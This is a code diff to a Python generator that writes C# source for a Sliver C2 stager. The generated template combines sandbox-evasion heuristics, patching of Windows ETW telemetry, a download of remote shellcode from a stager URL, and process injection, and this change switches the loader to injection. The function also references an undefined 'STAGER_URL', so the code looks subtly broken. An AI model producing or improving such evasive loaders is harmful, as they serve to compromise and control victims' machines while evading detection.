@@ -1,5 +1,5 @@
 #!/bin/env python3
-from ak import *
+import ak
 import os
 import subprocess
 
@@ -15,39 +15,34 @@ def get_shellcode(msfvenom_cmd):
   return shellcode
 
 def generate(stager_url):
-  url_dl_code = URL_DL_CODE.format(STAGER_URL=STAGER_URL)
+  url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=STAGER_URL)
 
   template = """
 using System;
 using System.Net;
 using System.Runtime.InteropServices;
+using System.Diagnostics;
 
 namespace SliverStager
 {{
     public class Stager
     {{
-        {START_SHELLCODE_IMPORT}
-        {HEURISTICS_IMPORT}
-        {ARCH_DETECTION}
-        {ETW_FUNCS}
+        {ak.START_PROCESS_INJECT_IMPORT}
+        {ak.HEURISTICS_IMPORT}
+        {ak.ARCH_DETECTION}
+        {ak.ETW_FUNCS}
         public static void Main()
         {{
-            {HEURISTICS_CODE}
-            {ETW_PATCH}
+            {ak.HEURISTICS_CODE}
+            {ak.ETW_PATCH}
             {URL_DL_CODE}
-            {START_SHELLCODE}
+            {ak.START_PROCESS_INJECT}
         }}
 
     }}
 }}
   """.format(URL_DL_CODE=url_dl_code,
-             HEURISTICS_IMPORT=HEURISTICS_IMPORT,
-             ETW_FUNCS=ETW_FUNCS,
-             HEURISTICS_CODE=HEURISTICS_CODE,
-             ETW_PATCH=ETW_PATCH,
-             ARCH_DETECTION=ARCH_DETECTION,
-             START_SHELLCODE_IMPORT=START_SHELLCODE_IMPORT,
-             START_SHELLCODE=START_SHELLCODE)
+             ak=ak)
 
   print(template)
   f = open(BASE_FILENAME + ".cs", "w")
